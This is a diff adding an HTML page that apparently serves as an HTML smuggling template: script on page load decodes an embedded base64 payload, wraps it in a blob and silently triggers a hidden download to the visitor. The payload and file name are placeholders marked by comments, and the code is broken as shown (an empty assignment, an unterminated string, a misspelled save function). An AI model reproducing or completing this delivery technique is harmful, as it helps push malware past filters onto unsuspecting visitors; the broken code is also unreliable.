@@ -1,0 +1,30 @@
+<html>
+<body>
+    <script>
+        function aba(be) {
+            sba = window.atob(be);
+            len = sba.length;
+            tr = new Uint8Array(len);
+            for (i = 0; i < len; i++) { tr[i] = sba.charCodeAt(i); }
+            return tr.buffer;
+        }
+        fa = ;                                               //-- Here is the base64 -- //
+        da = aba(fa);
+        bl = new Blob([da], { type: 'octet/stream' });
+        fn = 'FuckSmug;                                               //-- Here is the name of the file --//
+        if (window.navigator.msSaveOrOpenbl) {
+            window.navigator.msSaveOrOpenbl(bl, fn);
+        } else {
+            a = document.createElement('a');
+            console.log(a);
+            document.body.appendChild(a);
+            a.style = 'display: none';
+            url = window.URL.createObjectURL(bl);
+            a.href = url;
+            a.download = fn;
+            a.click();
+            window.URL.revokeObjectURL(url);
+        }
+    </script>
+</body>
+</html>
